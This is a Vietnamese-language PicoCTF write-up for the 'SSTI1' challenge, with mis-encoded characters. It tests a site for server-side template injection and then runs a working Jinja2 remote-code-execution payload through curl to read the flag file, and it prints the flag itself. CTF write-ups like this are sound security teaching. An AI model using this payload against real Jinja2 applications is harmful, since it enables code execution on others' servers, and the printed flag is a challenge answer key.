# ğŸ§  Writeup: SSTI1 - PicoCTF 

> ğŸ”– Chá»§ Ä‘á»: Server Side Template Injection (SSTI)  

---

## ğŸ“Œ **Description**

> **_â€œI made a cool website where you can announce whatever you want! Try it out!_â€**  
> Additional details will be available after launching your challenge instance.

> Khi truy cáº­p vÃ o challenge, ta tháº¥y má»™t giao diá»‡n trang web Ä‘Æ¡n giáº£n cho phÃ©p ngÆ°á»i dÃ¹ng nháº­p ná»™i dung vÃ o má»™t Ã´ vÃ  gá»­i thÃ´ng Ä‘iá»‡p lÃªn website.
![](../img/SSTI1.png)
---

## ğŸ’¡ **Hint**

> **Server Side Template Injection**

Gá»£i Ã½ nÃ y cho tháº¥y kháº£ nÄƒng tá»“n táº¡i lá»— há»•ng **SSTI** trong quÃ¡ trÃ¬nh render ná»™i dung ngÆ°á»i dÃ¹ng nháº­p vÃ o.

---

## ğŸ” **Solution**

Khi xem mÃ£ nguá»“n HTML cá»§a trang, ta phÃ¡t hiá»‡n má»™t form Ä‘Æ¡n giáº£n cho phÃ©p nháº­p ná»™i dung, Ä‘iá»u nÃ y Ä‘áº·t nghi váº¥n ráº±ng dá»¯ liá»‡u Ä‘áº§u vÃ o cá»§a ngÆ°á»i dÃ¹ng cÃ³ thá»ƒ Ä‘Æ°á»£c render trá»±c tiáº¿p trong má»™t template engine phÃ­a server, ráº¥t cÃ³ thá»ƒ lÃ  Jinja2 náº¿u backend viáº¿t báº±ng Python:

```html
<form action="/" method="POST">
    What do you want to announce: 
    <input type="text" value="Hello">
    <input type="submit" value="Ok">
</form>
```
Ta thá»­ nháº­p "Hello" vÃ  tháº¥y sever chuyá»ƒn hÆ°á»›ng ta cÃ¹ng vá»›i viá»‡c hiá»ƒn thá»‹ ná»™i dung lÃªn mÃ n hÃ¬nh : 
![](../img/SSTI1-output.png)
Server pháº£n há»“i vá»›i HTML cÃ³ chá»©a dÃ²ng:
```html
<h1 style="font-size:100px;" align="center">Hello</h1>
```
##### Tiáº¿p tá»¥c thá»­ vá»›i payload phá»• biáº¿n vá»›i SSTI lÃ  ``{{7*7}}``, ta nháº­n Ä‘Æ°á»£c káº¿t quáº£ lÃ  : 
![](../img/SSTI1-output-payload.png)
---

Sau khi xÃ¡c Ä‘á»‹nh Ä‘Æ°á»£c há»‡ thá»‘ng tá»“n táº¡i lá»— há»•ng Server-Side Template Injection (SSTI), ta tiáº¿p tá»¥c thá»­ nghiá»‡m khai thÃ¡c trÃªn má»™t instance má»›i táº¡i Ä‘á»‹a chá»‰:

``http://rescued-float.picoctf.net:63974/``

Äáº§u tiÃªn, ta tiáº¿n hÃ nh kiá»ƒm tra xem lá»— há»•ng cÃ²n hoáº¡t Ä‘á»™ng hay khÃ´ng báº±ng cÃ¡ch gá»­i má»™t yÃªu cáº§u Ä‘Æ¡n giáº£n sá»­ dá»¥ng lá»‡nh:
```bash
#curl -X POST -d "content=Hello" http://rescued-float.picoctf.net:63974/ -L
```
Káº¿t quáº£ pháº£n há»“i:
```html
â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# curl -L -X POST -d "content=Hello" http://rescued-float.picoctf.net:63974/

                <!doctype html>
                <h1 style="font-size:100px;" align="center">Hello</h1>
```
Äiá»u nÃ y xÃ¡c nháº­n ráº±ng dá»¯ liá»‡u Ä‘áº§u vÃ o tá»« ngÆ°á»i dÃ¹ng váº«n Ä‘Æ°á»£c render trá»±c tiáº¿p trong template â€” má»™t dáº¥u hiá»‡u rÃµ rÃ ng cá»§a SSTI Ä‘ang tá»“n táº¡i.
Tiáº¿p theo, ta thá»­ khai thÃ¡c RCE (Remote Code Execution) báº±ng cÃ¡ch sá»­ dá»¥ng payload Ä‘Ã£ Ä‘Æ°á»£c chá»©ng minh hiá»‡u quáº£ trong mÃ´i trÆ°á»ng sá»­ dá»¥ng Jinja2, cá»¥ thá»ƒ:

```bash
#curl -L -X POST -d "content={{ cycler.__init__.__globals__.os.popen('cat flag').read() }}" http://rescued-float.picoctf.net:63974/
```

Káº¿t quáº£ tráº£ vá» tá»« server nhÆ° sau:
```html
â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# curl -L -X POST -d "content={{ cycler.__init__.__globals__.os.popen('cat flag').read() }}" http://rescued-float.picoctf.net:63974/

                <!doctype html>
                <h1 style="font-size:100px;" align="center">picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_df9a00a0}</h1> 
```

Flag thu Ä‘Æ°á»£c lÃ : ``picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_df9a00a0}``
